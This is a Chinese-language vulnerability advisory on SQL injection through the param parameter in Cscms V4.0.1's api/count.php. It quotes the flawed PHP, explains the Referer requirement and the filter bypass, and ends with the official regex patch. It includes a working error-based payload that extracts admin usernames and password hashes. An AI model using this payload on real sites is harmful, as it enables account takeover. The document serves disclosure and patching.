# Cscms V4.0.1在app/controllers/api/count.php中param参数sql注入
---
### 1. 漏洞成因

在/app/controllers/api/count.php中对param参数过滤不严

首先来看这段代码

```
function __construct(){
	parent::__construct();
    $this->load->library('user_agent');
    if(!$this->agent->is_referral()) show_error('您访问的页面不存在~!',404,Web_Name.'提醒您');
	//关闭数据库缓存
    $this->db->cache_off();
}
```
必须要对Referer头进行定义才能访问到该页面

下面是关键代码

```
public function index()
{
  	$count=0;
  	$param=$this->input->get('param',true,true);
  	if(!empty($param)){
       $str=explode('|', $param);
	   $table=$str[0];
	   if(!empty($table) && $this->db->table_exists(CS_SqlPrefix.$table)){
		    $sql="";
	        for($j=1;$j<count($str);$j++){	
	         	$v=explode('=', $str[$j]);
		     	if($v[0]=='times'){
                 	$k=explode('-', $v[1]);
			     	$fidel=$k[0];
			     	$day=intval($k[1]);
			     	$times=strtotime(date('Y-m-d 0:0:0'))-$day*86400;
                 	$sql.="and ".$fidel.">".$times." ";
		     	}else{
				 	if(!empty($v[1])){
                     	$sql.="and ".$v[0]."='".$v[1]."' ";
				 	}else{
                     	$sql.="and ".$str[$j]." ";
				 	}
		     	}
			}
			if(substr($sql,0,3)=='and') $sql=substr($sql,3);
			if(!empty($sql)) $sql=" where".$sql;
			$sql="select id from `".CS_SqlPrefix.$table."` ".$sql;
			$count=$this->db->query($sql)->num_rows();
	   }
  	}
  	echo 'document.writeln("'.$count.'")';
}
```

在上面这段代码中可以看到$param由get参数获得，并对此参数进行了一定的过滤操作，输入的空格会被删除

$str由$param以 | 来进行切分获得，$table为$str第一个元素并作为数据库将要查询的表的名字

通过上面的代码我们可以知道，如果$str元素个数只有2个，$v[0]!='times'并且$v[1]为空的时候，$str第二个参数会被直接拼接到$sql的后面

可以构造出以下

```
?param=admin|(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(select/**/concat(char(45,45),adminname,char(45,45,45),adminpass,char(45,45))/**/from/**/v4_admin/**/limit/**/1))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
```
其中admin作为$table的值，| 后面则是另外一个查询

数据库最终执行的语句为：

![](http://images.sebug.net/contribute/807cca55-901e-4453-b6b6-23dd5e9b96de-1.png)

### 2. 漏洞验证
![](http://images.sebug.net/contribute/f1631dab-7ec0-456c-a344-5519ca57a5bf-3.png)

### 3. 漏洞影响版本
Cscms V4.0.1 且在2015-05-13补丁前的版本

### 4. 漏洞防护方案
升级到最新版

官方补丁对$param参数进行了更严格的过滤：

```
if(!preg_match("/^[a-zA-Z0-9_\|\=\-]+$/", $param)){
    $param='';
}
```